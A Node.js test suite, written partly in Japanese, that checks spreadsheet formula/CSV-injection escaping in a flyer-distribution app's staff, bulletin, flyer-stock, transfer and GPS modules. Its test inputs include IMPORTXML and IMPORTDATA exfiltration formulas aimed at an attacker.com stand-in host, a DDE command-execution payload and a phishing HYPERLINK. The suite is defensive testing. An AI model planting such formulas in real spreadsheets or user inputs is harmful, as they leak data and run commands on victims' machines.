#!/usr/bin/env node
/**
 * test_sec002_formula_injection.mjs
 * 
 * SEC-002: Spreadsheet Formula / CSV Injection 防御専用検証テストスイート
 * 
 * 目的:
 * 1. ユーザー入力文字列（氏名、掲示板本文、連絡先、保管場所）の先頭記号（=, +, -, @, \t, \r）が
 *    Spreadsheet書き込み時に必ずシングルクォート（'）でエスケープされ、数式実行が無効化されることの実証。
 * 2. 正常な日本語入力（「山田 太郎」「事務所」等）に不要なエスケープが付加されずそのまま保存されることの確認。
 * 3. GPS座標（数値文字列 "35.123" 等）がエスケープされず、純粋な数値型（Number）として保持されることの実証。
 * 4. 悪意ある数式文字列がGPS座標に渡された場合にバリデーションで拒絶されることの実証。
 */

import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';

console.log('================================================================');
console.log('🛡️ SEC-002 FORMULA / CSV INJECTION DEFENSE VERIFICATION SUITE');
console.log('================================================================\n');

const rootDir = process.cwd();

// モッククラスの定義
class MockSheet {
  constructor(name) {
    this.name = name;
    this.data = [];
  }
  getName() { return this.name; }
  getLastRow() { return this.data.length; }
  getLastColumn() { return this.data[0] ? this.data[0].length : 0; }
  getRange(row, col, numRows = 1, numCols = 1) {
    const sheet = this;
    return {
      getValues() {
        const slice = [];
        for (let r = 0; r < numRows; r++) {
          const rowIdx = row - 1 + r;
          const rowData = sheet.data[rowIdx] || [];
          const rowSlice = [];
          for (let c = 0; c < numCols; c++) {
            const colIdx = col - 1 + c;
            rowSlice.push(rowData[colIdx] !== undefined ? rowData[colIdx] : "");
          }
          slice.push(rowSlice);
        }
        return slice;
      },
      setValues(vals) {
        for (let r = 0; r < vals.length; r++) {
          const targetRowIdx = row - 1 + r;
          if (!sheet.data[targetRowIdx]) {
            sheet.data[targetRowIdx] = [];
          }
          for (let c = 0; c < vals[r].length; c++) {
            const targetColIdx = col - 1 + c;
            sheet.data[targetRowIdx][targetColIdx] = vals[r][c];
          }
        }
      },
      setValue(v) {
        if (!sheet.data[row - 1]) sheet.data[row - 1] = [];
        sheet.data[row - 1][col - 1] = v;
      },
      createTextFinder(val) {
        return {
          matchEntireCell: () => ({
            findNext: () => {
              for (let r = 0; r < sheet.data.length; r++) {
                if (String(sheet.data[r][0]) === String(val)) {
                  return { getRow: () => r + 1 };
                }
              }
              return null;
            }
          })
        };
      }
    };
  }
  appendRow(rowArr) {
    this.data.push([...rowArr]);
  }
}

const mockSheets = {
  '名簿2026-09': new MockSheet('名簿2026-09'),
  '掲示板': new MockSheet('掲示板'),
  '掲示板連絡履歴': new MockSheet('掲示板連絡履歴'),
  '保有チラシ枚数2026-09': new MockSheet('保有チラシ枚数2026-09'),
  '受渡要請履歴2026-09': new MockSheet('受渡要請履歴2026-09'),
  '配布実績2026-09': new MockSheet('配布実績2026-09')
};

// ヘッダーの初期化
mockSheets['名簿2026-09'].appendRow(['ID', '氏名', 'LINE_USER_ID', '登録日時']);
mockSheets['掲示板'].appendRow(['日時', '投稿者ID', '投稿者名', 'メッセージ']);
mockSheets['掲示板連絡履歴'].appendRow(['日時', '送信者ID', '送信者名', '相手ID', '連絡方法', '連絡先', 'requestId', 'LINE送信状態', 'LINE HTTP status', 'LINE送信日時']);
mockSheets['保有チラシ枚数2026-09'].appendRow(['ID', '配布員ID', '配布員名', '保管場所', '枚数', '更新日時', 'LINE_USER_ID']);
mockSheets['受渡要請履歴2026-09'].appendRow(['日時', '要請者', '要請者ID', '保管者', '保管者ID', '連絡方法', '連絡先', '状態', 'requestId', 'LINE送信状態', 'LINE HTTP status', 'LINE送信日時']);
mockSheets['配布実績2026-09'].appendRow(['rowId', 'cityName', 'townName', 'completedAt', 'count', 'staffId', 'staffName', 'gpsStatus', 'photoStatus', 'lat', 'lng', 'gpsTime', 'fileId', 'photoUrl', 'photoTime', 'lineUserId']);

// モックグローバル
global.SpreadsheetApp = {
  flush: () => {}
};

global.LockService = {
  getScriptLock: () => ({
    waitLock: () => true,
    releaseLock: () => {}
  })
};

global.Utilities = {
  formatDate: (d, tz, fmt) => '2026/09/25 12:00:00'
};

global.CacheService = {
  getScriptCache: () => ({
    get: () => null,
    put: () => {}
  })
};

global.MonthlySheetResolver = {
  getInstance: () => ({
    getCurrentSheet: (type) => {
      if (type === 'staff') return mockSheets['名簿2026-09'];
      if (type === 'bulletin') return mockSheets['掲示板'];
      if (type === 'flyer') return mockSheets['保有チラシ枚数2026-09'];
      if (type === 'transfer') return mockSheets['受渡要請履歴2026-09'];
      if (type === 'distribution') return mockSheets['配布実績2026-09'];
      return null;
    }
  })
};

global.getMonthlySheet = (t) => global.MonthlySheetResolver.getInstance().getCurrentSheet(t);
global.getSS = () => ({
  getSheetByName: (name) => mockSheets[name] || null,
  insertSheet: (name) => {
    if (!mockSheets[name]) mockSheets[name] = new MockSheet(name);
    return mockSheets[name];
  }
});

// ファイル読み込み & VM 実行
const staffModelCode = fs.readFileSync(path.join(rootDir, "active/business/staff/staff_model.js"), "utf8");
const staffRepoCode = fs.readFileSync(path.join(rootDir, "active/business/staff/staff_repository.js"), "utf8");
const bulletinServiceCode = fs.readFileSync(path.join(rootDir, "active/business/bulletin/bulletin_service.js"), "utf8");
const flyerRepoCode = fs.readFileSync(path.join(rootDir, "active/business/flyer/flyer_repository.js"), "utf8");
const transferServiceCode = fs.readFileSync(path.join(rootDir, "active/business/transfer/transfer_service.js"), "utf8");
const gpsRepoCode = fs.readFileSync(path.join(rootDir, "active/business/gps/gps_repository.js"), "utf8");

vm.runInThisContext(staffModelCode);
vm.runInThisContext(staffRepoCode);
vm.runInThisContext(bulletinServiceCode);
vm.runInThisContext(flyerRepoCode);
vm.runInThisContext(transferServiceCode);
vm.runInThisContext(gpsRepoCode);

console.log('✅ VM Context setup complete.\n');

// -------------------------------------------------------------
// TEST 1: staff_repository - 氏名の数式インジェクション無害化
// -------------------------------------------------------------
console.log('--- TEST 1: staff_repository insertNewStaff ---');
const staffRepo = StaffRepository.getInstance();

const attackNames = [
  { input: "=1+1", expected: "'=1+1", desc: "Basic formula (=)" },
  { input: "=IMPORTXML(\"https://attacker.com/leak\", \"//a\")", expected: "'=IMPORTXML(\"https://attacker.com/leak\", \"//a\")", desc: "Data exfiltration formula" },
  { input: "+819012345678", expected: "'+819012345678", desc: "Leading plus (+)" },
  { input: "-500", expected: "'-500", desc: "Leading minus (-)" },
  { input: "@SUM(A1:A10)", expected: "'@SUM(A1:A10)", desc: "Leading at (@)" },
  { input: "\t=calc", expected: "'=calc", desc: "Leading tab with formula (\\t=)" },
  { input: "\r+cmd", expected: "'+cmd", desc: "Leading CR with formula (\\r+)" },
  { input: "山田 太郎", expected: "山田 太郎", desc: "Normal Japanese name (unmodified)" }
];

// 直接 sanitizeFormula 単体検証（trim前の生文字列に対する防御）
assert.strictEqual(sanitizeFormula("\tmalicious_tab"), "'\tmalicious_tab", "sanitizeFormula must escape raw tab");
assert.strictEqual(sanitizeFormula("\rmalicious_cr"), "'\rmalicious_cr", "sanitizeFormula must escape raw CR");

for (const tc of attackNames) {
  const staff = new Staff({ name: tc.input, lineUserId: "U_TEST_" + Math.random().toString(36).substr(2, 6) });
  staffRepo.insertNewStaff(staff);
  const lastRow = mockSheets['名簿2026-09'].getLastRow();
  const storedName = mockSheets['名簿2026-09'].data[lastRow - 1][1];
  assert.strictEqual(storedName, tc.expected, `[staff_repository] Failed for: ${tc.desc}`);
  console.log(`  PASS: ${tc.desc} -> Stored: ${JSON.stringify(storedName)}`);
}

// -------------------------------------------------------------
// TEST 2: bulletin_service - 掲示板本文 & 連絡先の無害化
// -------------------------------------------------------------
console.log('\n--- TEST 2: bulletin_service createPost & sendContact ---');
const bulletinService = BulletinService.getInstance();

// 2-1: 掲示板投稿の数式インジェクション
const attackPosts = [
  { message: "=cmd|'/C calc'!A1", expected: "'=cmd|'/C calc'!A1", desc: "DDE execution attack" },
  { message: "@EVIL_USER", expected: "'@EVIL_USER", desc: "Leading at symbol" },
  { message: "本日もお疲れ様でした！", expected: "本日もお疲れ様でした！", desc: "Normal message (unmodified)" }
];

for (const tc of attackPosts) {
  bulletinService.createPost({
    staffId: "S001",
    staffName: "桑名 太郎",
    message: tc.message,
    lineUserId: "U_TEST_001"
  });
  const lastRow = mockSheets['掲示板'].getLastRow();
  const storedMsg = mockSheets['掲示板'].data[lastRow - 1][3];
  assert.strictEqual(storedMsg, tc.expected, `[bulletin_service] createPost Failed for: ${tc.desc}`);
  console.log(`  PASS: createPost -> ${tc.desc} -> Stored: ${JSON.stringify(storedMsg)}`);
}

// 2-2: 連絡先送信の数式インジェクション
bulletinService.sendContact({
  requestId: "req_sec002_001",
  requestUserId: "S001",
  targetStaffId: "S002",
  contactMethod: "LINE",
  contactValue: "=HYPERLINK(\"http://phishing.com\", \"Click Here\")"
});
const lastContactRow = mockSheets['掲示板連絡履歴'].getLastRow();
const storedContact = mockSheets['掲示板連絡履歴'].data[lastContactRow - 1][5];
assert.strictEqual(storedContact, "'=HYPERLINK(\"http://phishing.com\", \"Click Here\")", "sendContact contactValue must be escaped");
console.log(`  PASS: sendContact -> contactValue escaped: ${JSON.stringify(storedContact)}`);

// -------------------------------------------------------------
// TEST 3: flyer_repository - チラシ保管場所の無害化
// -------------------------------------------------------------
console.log('\n--- TEST 3: flyer_repository updateStock ---');
const flyerRepo = FlyerRepository.getInstance();

flyerRepo.updateStock(
  "=IMPORTDATA(\"http://attacker.com/leak\")",
  100,
  "桑名 太郎",
  "S001",
  "U_TEST_001"
);
const lastFlyerRow = mockSheets['保有チラシ枚数2026-09'].getLastRow();
const storedLocation = mockSheets['保有チラシ枚数2026-09'].data[lastFlyerRow - 1][3];
assert.strictEqual(storedLocation, "'=IMPORTDATA(\"http://attacker.com/leak\")", "flyer location must be escaped");
console.log(`  PASS: updateStock -> location escaped: ${JSON.stringify(storedLocation)}`);

// 正常な保管場所
flyerRepo.updateStock("本社事務所", 200, "桑名 太郎", "S001", "U_TEST_001");
const updatedLocation = mockSheets['保有チラシ枚数2026-09'].data[lastFlyerRow - 1][3];
assert.strictEqual(updatedLocation, "本社事務所", "normal location must remain unchanged");
console.log(`  PASS: updateStock -> normal location unmodified: ${JSON.stringify(updatedLocation)}`);

// -------------------------------------------------------------
// TEST 4: transfer_service - 受渡要請連絡先の無害化
// -------------------------------------------------------------
console.log('\n--- TEST 4: transfer_service requestFlyerTransfer ---');
const transferService = TransferService.getInstance();

transferService.requestFlyerTransfer({
  requestId: "req_transfer_001",
  requestUserId: "S001",
  holderUserId: "S002",
  contactMethod: "TEL",
  contactValue: "+819011112222",
  resolvedLineUserId: "U_TEST_001"
});
const lastTransferRow = mockSheets['受渡要請履歴2026-09'].getLastRow();
const storedTransferContact = mockSheets['受渡要請履歴2026-09'].data[lastTransferRow - 1][6];
assert.strictEqual(storedTransferContact, "'+819011112222", "transfer contactValue starting with + must be escaped");
console.log(`  PASS: requestFlyerTransfer -> contactValue escaped: ${JSON.stringify(storedTransferContact)}`);

// -------------------------------------------------------------
// TEST 5: gps_repository - 正常GPSのNumber型保持 & 不正数式の拒絶
// -------------------------------------------------------------
console.log('\n--- TEST 5: gps_repository updateSheetRecordAndLog ---');
const gpsRepo = GPSRepository.getInstance();

// 5-1: 日本国内の正常な数値文字列GPSはSpreadsheetへ純粋なNumberとして保存される
mockSheets['配布実績2026-09'].appendRow([
  "100", "テスト市", "テスト町", "", "", "", "", "NO", "NO", "", "", "", "", "", "", ""
]);

const resValidGps = gpsRepo.updateSheetRecordAndLog({
  latitude: "35.123456",
  longitude: "136.654321",
  count: 50,
  isDone: true,
  staffId: "S001",
  staffName: "=INJECTED_STAFF"
}, 100, "NO", "NO", null, null);

assert.strictEqual(resValidGps.success, true, "updateSheetRecordAndLog must succeed");

const targetDistRow = mockSheets['配布実績2026-09'].data[mockSheets['配布実績2026-09'].data.length - 1];
const storedStaffName = targetDistRow[6];
const storedGpsStatus = targetDistRow[7];
const storedLat = targetDistRow[9];
const storedLng = targetDistRow[10];

// 氏名はエスケープされること
assert.strictEqual(storedStaffName, "'=INJECTED_STAFF", "staffName in distribution row must be escaped");
console.log(`  PASS: staffName in GPS record escaped -> ${JSON.stringify(storedStaffName)}`);

// GPS Status が OK であること
assert.strictEqual(storedGpsStatus, "OK", "storedGpsStatus must be OK for valid Japanese coordinates");

// 日本国内正常GPSは文字列エスケープされず、純粋な Number 型として保持されること
assert.strictEqual(typeof storedLat, 'number', "storedLat must be a pure Number");
assert.strictEqual(storedLat, 35.123456, "storedLat value must equal 35.123456");
assert.strictEqual(typeof storedLng, 'number', "storedLng must be a pure Number");
assert.strictEqual(storedLng, 136.654321, "storedLng value must equal 136.654321");
console.log(`  PASS: Valid Japanese GPS preserved as pure Number: lat=${storedLat} (${typeof storedLat}), lng=${storedLng} (${typeof storedLng}), gpsStatus=${storedGpsStatus}`);

// 5-2: 悪意ある数式文字列が latitude に渡された場合、Number化でNaNとなりGPSとして拒絶されること
mockSheets['配布実績2026-09'].appendRow([
  "101", "テスト市", "テスト町", "", "", "", "", "NO", "NO", "", "", "", "", "", "", ""
]);

const resAttackGps = gpsRepo.updateSheetRecordAndLog({
  latitude: "=1+1",
  longitude: "135.0",
  count: 50,
  isDone: true,
  staffId: "S001",
  staffName: "桑名 太郎"
}, 101, "NO", "NO", null, null);

const targetAttackRow = mockSheets['配布実績2026-09'].data[mockSheets['配布実績2026-09'].data.length - 1];
const attackGpsStatus = targetAttackRow[7];
const attackLat = targetAttackRow[9];

assert.strictEqual(attackGpsStatus, "NO", "GPS status must be NO for invalid numeric coordinates");
assert.strictEqual(attackLat, "", "Invalid formula coordinate must not be written as lat");
console.log(`  PASS: Malicious formula latitude '=1+1' rejected: gpsStatus=${attackGpsStatus}, lat=${JSON.stringify(attackLat)}`);

console.log('\n================================================================');
console.log('🎉 ALL SEC-002 FORMULA / CSV INJECTION TESTS PASSED (100%)');
console.log('================================================================\n');
